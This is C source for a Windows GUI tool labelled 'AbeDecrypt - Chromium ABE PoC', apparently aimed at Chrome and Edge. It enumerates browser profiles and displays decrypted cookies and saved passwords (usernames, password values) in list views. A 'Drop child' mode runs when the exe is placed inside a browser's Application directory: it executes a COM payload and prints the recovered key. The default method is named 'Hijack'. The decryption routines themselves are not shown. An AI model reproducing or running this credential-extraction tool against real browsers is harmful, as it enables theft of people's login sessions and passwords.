/* anchor the two lists and the status control to the client area */
static VOID
AbeLayout(
    _In_ INT ClientWidth,
    _In_ INT ClientHeight)
{
    HWND CookieList = GetDlgItem(g_MainWindow, IDC_COOKIE_LIST);
    HWND PasswordList = GetDlgItem(g_MainWindow, IDC_PASSWORD_LIST);
    HWND Status = GetDlgItem(g_MainWindow, IDC_STATUS_EDIT);
    RECT CookieRect = { 0 }, PasswordRect = { 0 }, StatusRect = { 0 };
    INT Top, Gap = AbeScale(8), ListWidth, ListHeight;

    if (CookieList == NULL || PasswordList == NULL || Status == NULL) return;

    GetWindowRect(CookieList, &CookieRect);
    GetWindowRect(PasswordList, &PasswordRect);
    GetWindowRect(Status, &StatusRect);
    MapWindowPoints(HWND_DESKTOP, g_MainWindow, (LPPOINT)&StatusRect, 2);

    Top = AbeScale(44);
    ListWidth = ClientWidth - Gap * 2;
    {
        INT StatusHeight = StatusRect.bottom - StatusRect.top;

        ListHeight = (ClientHeight - Top - StatusHeight - Gap * 3) / 2;
        SetWindowPos(CookieList, NULL, Gap, Top, ListWidth, ListHeight, SWP_NOZORDER);
        SetWindowPos(PasswordList, NULL, Gap, Top + ListHeight + Gap, ListWidth, ListHeight, SWP_NOZORDER);
        SetWindowPos(Status,
                     NULL,
                     Gap,
                     Top + (ListHeight + Gap) * 2,
                     ListWidth,
                     StatusHeight,
                     SWP_NOZORDER);
    }
}

static LRESULT CALLBACK
AbeWndProc(
    _In_ HWND Window,
    _In_ UINT Message,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam)
{
    switch (Message)
    {
        case WM_COMMAND:
            switch (LOWORD(wParam))
            {
                case IDC_BROWSER_COMBO:
                    if (HIWORD(wParam) == CBN_SELENDOK)
                    {
                        ULONG Index = (ULONG)SendMessageW((HWND)lParam, CB_GETCURSEL, 0, 0);

                        AbeClearLists();
                        if (Index < g_BrowserCount)
                        {
                            AbeLoadProfiles(&g_Browsers[Index]);
                        }
                    }
                    break;
                case IDC_PROFILE_COMBO:
                case IDC_METHOD_COMBO:
                    if (HIWORD(wParam) == CBN_SELENDOK)
                    {
                        AbeClearLists();
                    }
                    break;
                case IDC_GO_BUTTON:
                {
                    PABE_JOB Job;
                    ULONG BrowserIndex, ProfileIndex, MethodIndex;
                    HWND Combo;

                    Combo = GetDlgItem(Window, IDC_BROWSER_COMBO);
                    BrowserIndex = (ULONG)SendMessageW(Combo, CB_GETCURSEL, 0, 0);
                    Combo = GetDlgItem(Window, IDC_PROFILE_COMBO);
                    ProfileIndex = (ULONG)SendMessageW(Combo, CB_GETCURSEL, 0, 0);
                    Combo = GetDlgItem(Window, IDC_METHOD_COMBO);
                    MethodIndex = (ULONG)SendMessageW(Combo, CB_GETCURSEL, 0, 0);
                    if (BrowserIndex >= g_BrowserCount || ProfileIndex >= g_ProfileCount ||
                        MethodIndex >= MethodMax)
                    {
                        MessageBoxW(Window, L"请选择浏览器、Profile 和方式", L"AbeDecrypt", MB_ICONWARNING);
                        break;
                    }
                    Job = Mem_Alloc(sizeof(*Job));
                    if (Job == NULL) break;
                    Job->Browser = g_Browsers[BrowserIndex];
                    Job->Entry = *AbeFindBrowserEntry(Job->Browser.Vendor);
                    Job->BrowserIndex = (ULONG)(AbeFindBrowserEntry(Job->Browser.Vendor) - AbeBrowsers);
                    Job->Method = (ABE_METHOD)MethodIndex;
                    Str_CopyExW(Job->Profile, MAX_PATH, g_Profiles[ProfileIndex].Directory);

                    SetDlgItemTextW(Window, IDC_STATUS_EDIT, L"正在运行……");
                    EnableWindow(GetDlgItem(Window, IDC_GO_BUTTON), FALSE);
                    if (!QueueUserWorkItem(AbeWorker, Job, WT_EXECUTELONGFUNCTION))
                    {
                        EnableWindow(GetDlgItem(Window, IDC_GO_BUTTON), TRUE);
                        Mem_Free(Job);
                    }
                    break;
                }
                default:
                    break;
            }
            break;
        case WM_APP + 1:
        {
            PABE_RESULT Result = (PABE_RESULT)lParam;

            AbeFillList(GetDlgItem(Window, IDC_COOKIE_LIST), Result->Cookies, Result->CookieCount);
            AbeFillList(GetDlgItem(Window, IDC_PASSWORD_LIST), Result->Passwords, Result->PasswordCount);
            SetDlgItemTextW(Window, IDC_STATUS_EDIT, Result->Status);
            if (!Result->Ok)
            {
                MessageBeep(MB_ICONERROR);
            }
            EnableWindow(GetDlgItem(Window, IDC_GO_BUTTON), TRUE);
            Mem_Free(Result->Cookies);
            Mem_Free(Result->Passwords);
            Mem_Free(Result);
            return 0;
        }
        case WM_SIZE:
            AbeLayout(LOWORD(lParam), HIWORD(lParam));
            break;
        case WM_DESTROY:
            Mem_Free(g_Profiles);
            g_Profiles = NULL;
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProcW(Window, Message, wParam, lParam);
    }
    return 0;
}

/* Drop child detection: our exe resides inside a browser Application directory
   and the command line carries the Drop marker */
static BOOL
AbeIsDropChild(
    _Out_ PNET_BROWSER_INFO Browser)
{
    static const PCWSTR Markers[ARRAYSIZE(AbeBrowsers)] = {
        L"\\Microsoft\\Edge\\Application\\",
        L"\\Google\\Chrome\\Application\\",
    };
    WCHAR Self[MAX_PATH];
    PCWSTR Cmd = GetCommandLineW();
    PNET_BROWSER_INFO List;
    ULONG Count, i, j;
    BOOL Found = FALSE;

    if (Cmd == NULL || !AbeStrIContainsW(Cmd, L"Drop") ||
        GetModuleFileNameW(NULL, Self, MAX_PATH) == 0)
    {
        return FALSE;
    }
    if (!NT_SUCCESS(Net_BrowserEnumerate(&List, &Count)))
    {
        return FALSE;
    }
    for (i = 0; i < ARRAYSIZE(Markers) && !Found; i++)
    {
        if (!AbeStrIContainsW(Self, Markers[i])) continue;
        for (j = 0; j < Count; j++)
        {
            if (_wcsicmp(List[j].Vendor, AbeBrowsers[i].Vendor) == 0)
            {
                *Browser = List[j];
                Found = TRUE;
                break;
            }
        }
    }
    Mem_Free(List);
    return Found;
}

int
APIENTRY
wWinMain(
    _In_ HINSTANCE Instance,
    _In_opt_ HINSTANCE PreviousInstance,
    _In_ PWSTR CommandLine,
    _In_ int ShowCmd)
{
    WNDCLASSEXW Class;
    NONCLIENTMETRICSW Metrics;
    ULONG i;

    UNREFERENCED_PARAMETER(PreviousInstance);
    UNREFERENCED_PARAMETER(CommandLine);

    /* Drop child: no window, run the COM payload and report the key on stdout */
    {
        NET_BROWSER_INFO ChildBrowser;

        if (AbeIsDropChild(&ChildBrowser))
        {
            ULONG Index;
            BOOL Ok = FALSE;

            for (Index = 0; Index < ARRAYSIZE(AbeBrowsers); Index++)
            {
                if (_wcsicmp(ChildBrowser.Vendor, AbeBrowsers[Index].Vendor) == 0) break;
            }
            if (Index < ARRAYSIZE(AbeBrowsers))
            {
                Ok = AbeDropChild(&ChildBrowser, Index);
            }
            return Ok ? 0 : 1;
        }
    }

    SetProcessDpiAwarenessContext(DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2);
    InitCommonControlsEx(&(INITCOMMONCONTROLSEX){ sizeof(INITCOMMONCONTROLSEX),
                         ICC_LISTVIEW_CLASSES | ICC_STANDARD_CLASSES });
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    RtlZeroMemory(&Metrics, sizeof(Metrics));
    Metrics.cbSize = sizeof(Metrics);
    SystemParametersInfoW(SPI_GETNONCLIENTMETRICS, sizeof(Metrics), &Metrics, 0);
    g_Font = CreateFontIndirectW(&Metrics.lfMessageFont);

    RtlZeroMemory(&Class, sizeof(Class));
    Class.cbSize = sizeof(Class);
    Class.lpfnWndProc = AbeWndProc;
    Class.hInstance = Instance;
    Class.hCursor = LoadCursorW(NULL, (PCWSTR)IDC_ARROW);
    Class.hIcon = LoadIconW(NULL, (PCWSTR)IDI_APPLICATION);
    Class.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    Class.lpszClassName = L"AbeDecryptWindow";
    if (RegisterClassExW(&Class) == 0)
    {
        return 1;
    }

    g_MainWindow = CreateWindowExW(0,
                                   Class.lpszClassName,
                                   L"AbeDecrypt - Chromium ABE PoC",
                                   WS_OVERLAPPEDWINDOW,
                                   CW_USEDEFAULT,
                                   CW_USEDEFAULT,
                                   AbeScale(860),
                                   AbeScale(600),
                                   NULL,
                                   NULL,
                                   Instance,
                                   NULL);
    if (g_MainWindow == NULL)
    {
        return 1;
    }
    g_Dpi = GetDpiForWindow(g_MainWindow);
    if (g_Dpi != USER_DEFAULT_SCREEN_DPI)
    {
        SetWindowPos(g_MainWindow,
                     NULL,
                     0,
                     0,
                     AbeScale(860),
                     AbeScale(600),
                     SWP_NOMOVE | SWP_NOZORDER);
    }

    /* controls */
    {
        INT x = AbeScale(8), y = AbeScale(10);
        HWND Combo;

        (VOID)AbeCreateControl(L"STATIC",
                               L"浏览器:",
                               SS_CENTERIMAGE,
                               0,
                               x,
                               y,
                               AbeScale(44),
                               AbeScale(22),
                               0);
        Combo = AbeCreateControl(L"COMBOBOX",
                                 NULL,
                                 CBS_DROPDOWNLIST | WS_VSCROLL | WS_TABSTOP,
                                 0,
                                 x + AbeScale(48),
                                 y - AbeScale(2),
                                 AbeScale(110),
                                 AbeScale(200),
                                 IDC_BROWSER_COMBO);
        (VOID)AbeCreateControl(L"STATIC",
                               L"Profile:",
                               SS_CENTERIMAGE,
                               0,
                               x + AbeScale(166),
                               y,
                               AbeScale(46),
                               AbeScale(22),
                               0);
        Combo = AbeCreateControl(L"COMBOBOX",
                                 NULL,
                                 CBS_DROPDOWNLIST | WS_VSCROLL | WS_TABSTOP,
                                 0,
                                 x + AbeScale(216),
                                 y - AbeScale(2),
                                 AbeScale(170),
                                 AbeScale(200),
                                 IDC_PROFILE_COMBO);
        (VOID)AbeCreateControl(L"STATIC",
                               L"方式:",
                               SS_CENTERIMAGE,
                               0,
                               x + AbeScale(394),
                               y,
                               AbeScale(40),
                               AbeScale(22),
                               0);
        Combo = AbeCreateControl(L"COMBOBOX",
                                 NULL,
                                 CBS_DROPDOWNLIST | WS_VSCROLL | WS_TABSTOP,
                                 0,
                                 x + AbeScale(438),
                                 y - AbeScale(2),
                                 AbeScale(100),
                                 AbeScale(200),
                                 IDC_METHOD_COMBO);
        for (i = 0; i < MethodMax; i++)
        {
            SendMessageW(Combo, CB_ADDSTRING, 0, (LPARAM)AbeMethodNames[i]);
        }
        SendMessageW(Combo, CB_SETCURSEL, (WPARAM)MethodHijack, 0);

        (VOID)AbeCreateControl(L"BUTTON",
                               L"解密",
                               BS_PUSHBUTTON | WS_TABSTOP,
                               0,
                               x + AbeScale(550),
                               y - AbeScale(2),
                               AbeScale(80),
                               AbeScale(26),
                               IDC_GO_BUTTON);

        {
            static const PCWSTR CookieColumns[] = { L"版本", L"域名", L"名称", L"值", NULL };
            static const INT CookieWidths[] = { 50, 180, 140, 400 };
            static const PCWSTR PasswordColumns[] = { L"版本", L"站点", L"用户名", L"密码", NULL };
            static const INT PasswordWidths[] = { 50, 220, 140, 300 };

            (VOID)AbeCreateList(IDC_COOKIE_LIST,
                                CookieColumns,
                                CookieWidths,
                                AbeScale(8),
                                AbeScale(44),
                                AbeScale(836),
                                AbeScale(220));
            (VOID)AbeCreateList(IDC_PASSWORD_LIST,
                                PasswordColumns,
                                PasswordWidths,
                                AbeScale(8),
                                AbeScale(272),
                                AbeScale(836),
                                AbeScale(180));
            (VOID)AbeCreateControl(L"EDIT",
                                   L"",
                                   ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY | WS_VSCROLL | WS_TABSTOP,
                                   WS_EX_CLIENTEDGE,
                                   AbeScale(8),
                                   AbeScale(460),
                                   AbeScale(836),
                                   AbeScale(100),
                                   IDC_STATUS_EDIT);
        }
    }

    /* browsers; no default selection - profiles load on selection only */
    if (NT_SUCCESS(Net_BrowserEnumerate(&g_Browsers, &g_BrowserCount)))
    {
        HWND Combo = GetDlgItem(g_MainWindow, IDC_BROWSER_COMBO);

        for (i = 0; i < g_BrowserCount; i++)
        {
            SendMessageW(Combo, CB_ADDSTRING, 0, (LPARAM)g_Browsers[i].Name);
        }
    }

    ShowWindow(g_MainWindow, ShowCmd);
    UpdateWindow(g_MainWindow);
    UI_MessageLoop(NULL, FALSE, NULL, NULL);

    Mem_Free(g_Browsers);
    Mem_Free(g_Profiles);
    return 0;
}
